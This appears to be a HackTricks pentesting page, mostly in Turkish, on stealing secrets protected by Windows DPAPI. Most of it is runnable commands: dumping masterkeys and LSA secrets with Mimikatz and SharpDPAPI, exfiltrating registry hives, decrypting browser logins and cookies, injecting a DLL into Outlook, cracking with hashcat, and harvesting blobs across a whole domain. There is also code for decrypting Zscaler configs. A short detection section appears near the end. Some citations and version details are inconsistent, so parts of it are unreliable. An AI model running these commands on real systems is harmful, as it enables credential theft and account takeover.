# DPAPI - Parolaları Çıkarma

{{#include ../../banners/hacktricks-training.md}}



## DPAPI nedir

Data Protection API (DPAPI), Windows işletim sisteminde öncelikli olarak **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır ve önemli bir entropi kaynağı olarak kullanıcı veya sistem sırlarından yararlanır. Bu yaklaşım, geliştiricilerin verileri kullanıcının oturum açma sırlarından türetilen bir anahtarla veya sistem şifrelemesi için sistemin etki alanı kimlik doğrulama sırlarıyla şifrelemesine olanak tanıyarak şifreleme anahtarını koruma işini geliştiricilerin üstlenmesi gerekliliğini ortadan kaldırır.

DPAPI'yi kullanmanın en yaygın yolu, uygulamaların verileri oturum açmış olan sürecin güvenlik bağlamını kullanarak şifrelemesine ve şifresini çözmesine olanak tanıyan **`CryptProtectData` ve `CryptUnprotectData`** işlevleridir. Varsayılan olarak, verilerin şifresi yalnızca onu şifreleyen aynı kullanıcı veya sistem bağlamında çözülebilir.<sup>[[2]](#references)[[3]](#references)</sup>

Bu işlevler, şifreleme ve şifre çözme sırasında kullanılan isteğe bağlı bir **entropi parametresini** de kabul eder. İsteğe bağlı entropiyle korunan verilerin şifresini çözmek için aynı entropi değerinin kullanılması gerekir.<sup>[[2]](#references)[[6]](#references)</sup>

### Kullanıcı anahtarı oluşturma

DPAPI, kullanıcının kimlik bilgileri üzerinden kullanıcıya özgü bir değer (genellikle **ön anahtar** olarak adlandırılır) türetir. Türetilen değer, hesaba ve işletim sistemi sürümüne göre değişir. Örneğin Impacket, parolanın UTF-16LE biçimindeki SHA-1 özetini temel alan bir HMAC-SHA1 yolunu, parolanın MD4/NT hash'ini temel alan başka bir yolu ve Protected Users için PBKDF2-SHA256 ile türetilen bir yolu dener. Bu nedenle çevrimdışı araçlar, gerekli materyali genellikle hem düz metin paroladan hem de mevcut bir NT hash'inden türetebilir.<sup>[[2]](#references)[[10]](#references)</sup>

Bu özellikle ilgi çekicidir; çünkü bir saldırgan kullanıcının parola hash'ini ele geçirebilirse:

- Herhangi bir API'ye bağlanması gerekmeden, kullanıcının anahtarıyla DPAPI kullanılarak şifrelenmiş **her türlü verinin şifresini çözebilir**
- Geçerli DPAPI anahtarını üretmek için çevrimdışı olarak **parolayı kırmayı** deneyebilir

DPAPI, korunan her blob için yeni bir ana anahtar oluşturmak yerine her kullanıcı için bir veya daha fazla **ana anahtar** tutar. Her ana anahtarın bir **GUID**'si (Globally Unique Identifier) vardır ve şifrelenmiş blob, onu hangi ana anahtarın koruduğunu kaydeder.<sup>[[2]](#references)</sup>

Ana anahtarlar, kullanıcının Security Identifier'ı olan `{SID}` değerinin yer aldığı **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır. Anahtar dosyası, kullanıcının **ön anahtarı** tarafından korunan materyali ve etki alanı kullanıcıları için **etki alanı yedekleme anahtarı** tarafından korunan kurtarma materyalini içerir.<sup>[[2]](#references)</sup>

**Ana anahtarı şifrelemek için kullanılan etki alanı anahtarının etki alanı denetleyicilerinde bulunduğunu ve hiç değişmediğini** unutmayın. Bu nedenle bir saldırgan etki alanı denetleyicisine erişebiliyorsa etki alanı yedekleme anahtarını alıp etki alanındaki tüm kullanıcıların ana anahtarlarının şifresini çözebilir.<sup>[[2]](#references)</sup>

Şifrelenmiş blob'ların başlıklarında, içindeki verileri şifrelemek için kullanılan **ana anahtarın GUID'si** bulunur.

> [!TIP]
> DPAPI ile şifrelenmiş blob'lar **`01 00 00 00`** ile başlar

Ana anahtarları bulma:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of a user's Master Keys will look like:

![What is DPAPI - Users key generation: This is what a bunch of a user's Master Keys will look like](<../../images/image (1121).png>)

### Machine/System key generation

This is the key used by the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible to the system itself, such as machine-level credentials or system-wide secrets.<sup>[[2]](#references)</sup>

Note that these keys **don't have a domain backup**, so they are only accessible locally:

- **Mimikatz** can access it by dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored in the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is also possible. For example, as an administrator on the target, save the hives and exfiltrate them:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Ardından analysis makinenizde, hive dosyalarından DPAPI_SYSTEM LSA secret'ını kurtarın ve bunu machine-scope DPAPI blob'larını (örneğin, makine korumalı uygulama kimlik bilgilerini veya Wi-Fi profillerini) decrypt etmek için kullanın:

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam'e özel DPAPI örneği:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI Tarafından Korunan Veriler

DPAPI tarafından korunan kişisel veriler arasında şunlar bulunur:

- Windows kimlik bilgileri
- Internet Explorer ve Google Chrome parolaları ve otomatik tamamlama verileri
- Outlook ve Windows Mail gibi uygulamalardaki e-posta ve dahili FTP hesaplarının parolaları
- Şifreleme anahtarları dahil, paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar
- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için kullanılan özel anahtarların parolaları
- Credential Manager tarafından yönetilen ağ parolaları ve Skype, MSN Messenger ve diğer CryptProtectData kullanan uygulamalardaki kişisel veriler
- Kayıt defterindeki şifrelenmiş blob'lar
- ...

Sistem tarafından korunan veriler şunları içerir:
- Wi-Fi parolaları
- ...

Zamanlanmış görev parolaları, ayrı bir LSA-secret konusudur. [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) ile kaydedilen bir görev, yerel yönetici/SYSTEM kurtarması için parola depolayabilir; S4U veya etkileşimli belirteç kullanan bir görev ise parola kaydedildiğini göstermez. Bir görevin principal'ı ve oturum açma türü, yalnızca run-as adından daha güçlü göstergelerdir.

### Master key çıkarma seçenekleri

- Kullanıcının domain admin ayrıcalıkları varsa, domain'deki tüm kullanıcı master key'lerini çözmek için **domain backup key**'e erişebilir:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Yerel yönetici ayrıcalıklarıyla, oturum açmış tüm kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- Kullanıcının yerel yönetici ayrıcalıkları varsa, makine ana anahtarlarının şifresini çözmek için **DPAPI_SYSTEM LSA secret**'a erişebilirler:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- Kullanıcının parolası veya NTLM hash'i biliniyorsa, kullanıcının master key'lerini doğrudan **decrypt** edebilirsiniz:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- Kullanıcı olarak bir session içindeyseniz, **RPC kullanarak master keys'i decrypt etmek için backup key'i** DC'den isteyebilirsiniz. Local admin yetkiniz varsa ve kullanıcı oturum açmışsa, bunun için **session token'ını çalabilirsiniz**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault'u Listele

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI ile Şifrelenmiş Verilere Erişim

### DPAPI ile Şifrelenmiş Verileri Bulma

Kullanıcı dosyaları genellikle şu konumlarda **korunur**:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanarak da kontrol edin.

Sayım örnekleri:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) dosya sisteminde, kayıt defterinde ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Not: Aynı repo'daki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI), cookies gibi hassas verileri DPAPI kullanarak decrypt etmek için kullanılabilir.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron hızlı kullanım örnekleri (SharpChrome)

- Mevcut kullanıcı için, kayıtlı logins/cookies'in etkileşimli olarak decrypt edilmesi (kullanıcı bağlamında çalıştırıldığında, kullanıcı Credential Manager'ından ek anahtarı çözdüğü için Chrome 127+ app-bound cookies ile de çalışır):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Yalnızca dosyalara erişiminiz olduğunda çevrimdışı analiz. Önce profilin "Local State" dosyasından AES state key’i çıkarın, ardından cookie DB’yi çözmek için kullanın:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- DPAPI etki alanı yedekleme anahtarına (PVK) ve hedef hostta admin yetkisine sahip olduğunuzda etki alanı genelinde/uzaktan triyaj:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- Bir kullanıcının DPAPI prekey/credkey değerine (LSASS'ten) sahipseniz, parola kırma adımını atlayıp profil verilerinin şifresini doğrudan çözebilirsiniz:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Notes
- Daha yeni Chrome/Edge sürümleri, belirli çerezleri "App-Bound" encryption kullanarak depolayabilir. Bu çerezlerin offline decryption işlemi, ek app-bound key olmadan mümkün değildir; bu anahtarı otomatik olarak almak için SharpChrome'u hedef kullanıcının bağlamında çalıştırın. Aşağıda referans verilen Chrome güvenlik blogu gönderisine bakın.<sup>[[5]](#references)</sup>

### Access keys and data

- **DPAPI ile şifrelenmiş dosyalardan geçerli oturumun kimlik bilgilerini almak için SharpDPAPI kullanın**:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Kimlik bilgisi verilerini** (şifrelenmiş veriler ve guidMasterKey gibi) alın.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Masterkey'lere erişim**:

RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'ini decrypt edin:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** aracı, masterkey decryption için bu argümanları da destekler (domain backup key'i almak için `/rpc`, plaintext password kullanmak için `/password` veya DPAPI domain private key dosyası belirtmek için `/pvk` kullanılabildiğine dikkat edin...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkey kullanarak verilerin şifresini çözme**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** aracı, `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme işlemleri için şu argümanları da destekler (`/rpc` ile etki alanının yedekleme anahtarını almanın, düz metin parola kullanmak için `/password`, DPAPI etki alanı özel anahtar dosyasını belirtmek için `/pvk` ve mevcut kullanıcının oturumunu kullanmak için `/unprotect` kullanmanın mümkün olduğuna dikkat edin...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey değerini doğrudan kullanma (parola gerekmez)

LSASS’ı dump edebiliyorsanız Mimikatz genellikle kullanıcıların masterkey’lerini açık parolayı bilmeden çözmek için kullanılabilen, oturum başına bir DPAPI anahtarı sunar. Bu değeri doğrudan araca geçin:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çözün:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py ile çevrimdışı şifre çözme

Kurban kullanıcının SID ve parolasına (veya NT hash'ine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey’lerinin ve Credential Manager blob’larının şifresini tamamen çevrimdışı çözebilirsiniz.<sup>[[10]](#references)[[11]](#references)</sup>

- Diskteki artefact’ları belirleyin:
  - Credential Manager blob(ları): %APPDATA%\Microsoft\Credentials\<hex>
  - Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Dosya aktarım araçları güvenilir çalışmıyorsa, dosyaları ana makinede base64'e çevirip çıktıyı kopyalayın:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Kullanıcının SID'si ve parolası/hash'i ile masterkey'i decrypt edin:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Credential blob'u decrypt etmek için decrypt edilmiş masterkey'i kullanın:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Bu iş akışı, Windows Credential Manager kullanan uygulamaların kaydettiği etki alanı kimlik bilgilerini, yönetici hesapları da dahil olmak üzere (ör. `*_adm`), çoğu zaman kurtarır.

---

### İsteğe Bağlı Entropy'nin İşlenmesi ("Üçüncü taraf entropy")

Bazı uygulamalar `CryptProtectData` işlevine ek bir **entropy** değeri iletir. Bu değer olmadan, doğru masterkey bilinse bile blob çözülemez. Bu nedenle, bu şekilde korunan kimlik bilgilerini hedeflerken entropy'yi elde etmek önemlidir (ör. Microsoft Outlook ve bazı VPN istemcileri).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022), hedef süreç içindeki DPAPI işlevlerine hook koyan ve sağlanan tüm isteğe bağlı entropy değerlerini şeffaf biçimde kaydeden, kullanıcı modunda çalışan bir DLL'dir. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran süreç ve blob ile eşleştiren bir dosya oluşturur. Yakalanan entropy daha sonra verileri çözmek için **SharpDPAPI**'ye (`/entropy:`) veya **Mimikatz**'e (`/entropy:<file>`) sağlanabilir.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Masterkey'leri offline cracking (Hashcat & DPAPISnoop)

Microsoft, Windows 10 v1607'den (2016) itibaren **context 3** masterkey formatını kullanıma sundu. `hashcat` v6.2.6 (Aralık 2023), masterkey dosyasından kullanıcı parolalarının doğrudan GPU hızlandırmalı cracking işlemini sağlayan **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) hash-mode'larını ekledi. Böylece saldırganlar, hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) bu süreci otomatikleştirir:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Araç ayrıca Credential ve Vault blob'larını ayrıştırabilir, kırılmış anahtarlarla şifrelerini çözebilir ve açık metin parolaları dışa aktarabilir.<sup>[[8]](#references)</sup>


### Diğer makine verilerine erişim

**SharpDPAPI ve SharpChrome** araçlarında, uzak bir makinenin verilerine erişmek için **`/server:HOST`** seçeneğini belirtebilirsiniz. Elbette bu makineye erişebilmeniz gerekir. Aşağıdaki örnekte **domain backup encryption key'in bilindiği** varsayılmıştır:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### SSRS rapor sunucusu veritabanı bağlantısı

SQL Server Reporting Services (SSRS) barındıran bir makinede, `RSReportServer.config` dosyasında rapor sunucusu veritabanına ait şifrelenmiş bir `<Dsn>` bulunabilir.<sup>[[15]](#references)</sup> SSRS bu bağlantı ayarlarını **yerel makine düzeyinde bir anahtarla** korur; harici rapor veri kaynaklarına ait kimlik bilgileri ise rapor sunucusu veritabanında simetrik anahtarıyla şifrelenir.<sup>[[14]](#references)</sup>

Bildirilen olayda saldırgan, `Dsn` değerini çıkardı ve Base64'ten çözülen baytların şifresini `ProtectedData.Unprotect` ve `LocalMachine` kapsamıyla çözmeyi denedi.<sup>[[13]](#references)</sup>

Dosyayı koruyan makinedeki SSRS yapılandırma dosyasına okuma erişiminiz varsa, gerçek örnek yolunu bulun ve değeri inceleyin. Örnek yol SSRS 2017 ve sonraki sürümler içindir; makine düzeyinde koruma için SSRS hizmet hesabı bağlamı gerekmez.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

Boş veya bulunmayan bir `Dsn`, bu yöntemin çözeceği hiçbir şey olmadığı anlamına gelir.<sup>[[15]](#references)</sup> Çözülmüş bir bağlantı dizesi mutlaka yeniden kullanılabilir bir parola içermez: SSRS kendi hizmet hesabını kullanabilir veya yapılandırılmış bir domain hesabında ayrı `LogonUser`, `LogonDomain` ve `LogonCred` ayarları bulunabilir.<sup>[[15]](#references)</sup> Yalnızca şifrelenmiş değeri başka bir makineye kopyalamak, o makineye kaynak makinenin koruma anahtarını sağlamaz.<sup>[[14]](#references)</sup>

Diğer SQL Server erişim yolları için [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/) sayfasına bakın.

## Diğer araçlar

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB), LDAP dizinindeki tüm kullanıcıları ve bilgisayarları çıkarmayı ve RPC aracılığıyla domain controller backup key'i almayı otomatikleştiren bir araçtır. Ardından script tüm bilgisayarların IP adreslerini çözer ve tüm bilgisayarlarda smbclient çalıştırarak tüm kullanıcıların DPAPI blob'larını alır ve domain backup key ile hepsinin şifresini çözer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP'den çıkarılan bilgisayar listesiyle, bilmediğiniz alt ağları bile bulabilirsiniz!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI), DPAPI tarafından korunan sırları otomatik olarak dump edebilir. 2.x sürümünde şunlar sunulmuştur:<sup>[[9]](#references)</sup>

* Yüzlerce hosttan blob'ların paralel olarak toplanması
* **context 3** masterkey'lerinin ayrıştırılması ve otomatik Hashcat cracking entegrasyonu
* Chrome "App-Bound" şifrelenmiş çerezleri için destek (sonraki bölüme bakın)
* Yeni bir **`--snapshot`** modu; uç noktaları tekrar tekrar sorgulayıp yeni oluşturulan blob'ların farkını bulur

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop), masterkey/credential/vault dosyaları için Hashcat/JtR formatlarında çıktı üretebilen ve isteğe bağlı olarak otomatik cracking başlatabilen bir C# parser'ıdır. Windows 11 24H1'e kadar olan makine ve kullanıcı masterkey formatlarını tam olarak destekler.<sup>[[8]](#references)</sup>


## Yaygın tespitler

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` ve DPAPI ile ilgili diğer dizinlerdeki dosyalara erişim.
    - Özellikle **C$** veya **ADMIN$** gibi bir ağ paylaşımından erişim.
- LSASS belleğine erişmek veya masterkey'leri dump etmek için **Mimikatz**, **SharpDPAPI** ya da benzer araçların kullanılması.
- Olay **4662**: *Bir nesne üzerinde işlem gerçekleştirildi* – **`BCKUPKEY`** nesnesine erişimle ilişkilendirilebilir.
- Bir işlem *SeTrustedCredManAccessPrivilege* (Credential Manager) istediğinde oluşan **4673/4674** olayları.

---
### 2023-2025 güvenlik açıkları ve ekosistem değişiklikleri

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (Kasım 2023). Ağ erişimi olan bir saldırgan, domain üyesini kötü amaçlı bir DPAPI backup key almaya yönlendirebilir ve böylece kullanıcı masterkey'lerinin şifresini çözebilir. Kasım 2023 toplu güncelleştirmesinde yamalandı – yöneticiler DC'lerin ve iş istasyonlarının tamamen yamalı olduğundan emin olmalıdır.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (Temmuz 2024), eski yalnızca DPAPI korumasının yerini, kullanıcının **Credential Manager**'ında saklanan ek bir anahtarla aldı. Çerezlerin çevrimdışı şifresini çözmek artık hem DPAPI masterkey'ini hem de **GCM-wrapped app-bound key**'i gerektiriyor. SharpChrome v2.3 ve DonPAPI 2.x, kullanıcı bağlamında çalışırken ek anahtarı alabilir.<sup>[[5]](#references)</sup>


### Örnek olay: Zscaler Client Connector – SID'den türetilen özel entropy

Zscaler Client Connector, çeşitli yapılandırma dosyalarını `C:\ProgramData\Zscaler` altında saklar (ör. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Her dosya **DPAPI (Machine scope)** ile şifrelenir; ancak üretici, diskte saklanmak yerine *çalışma zamanında hesaplanan* **özel entropy** sağlar.<sup>[[1]](#references)</sup>

Entropy iki öğeden yeniden oluşturulur:

1. `ZSACredentialProvider.dll` içine gömülü, sabit kodlanmış bir sır.
2. Yapılandırmanın ait olduğu Windows hesabının **SID**'si.

DLL'de uygulanan algoritma şu işleme denktir:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Gizli bilgi diskten okunabilen bir DLL içine gömülü olduğundan, **SYSTEM haklarına sahip herhangi bir yerel saldırgan herhangi bir SID için entropiyi yeniden oluşturabilir** ve blob'ların şifresini çevrimdışı çözebilir:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Decryption, beklenen değeriyle birlikte her **device posture check** dahil olmak üzere eksiksiz JSON yapılandırmasını ortaya çıkarır. Bu bilgiler, client-side bypass denemelerinde çok değerlidir.

> TIP: Diğer şifrelenmiş artefact’lar (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`), DPAPI ile **entropy olmadan** (`16` sıfır baytı) korunur. Bu nedenle SYSTEM yetkileri elde edildikten sonra `ProtectedData.Unprotect` ile doğrudan çözülebilirler.

## References

- [1] [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI'de güvenlik analizi ve veri kurtarma](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz ve C++ ile DPAPI şifreli sırları okuma](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows'ta Chrome çerezlerinin güvenliğini artırma](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI isteğe bağlı entropy'sinin basitçe çıkarılması](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 sürüm notları](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub deposu](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI proje sayfası](https://pypi.org/project/donpapi/2.0.0/)
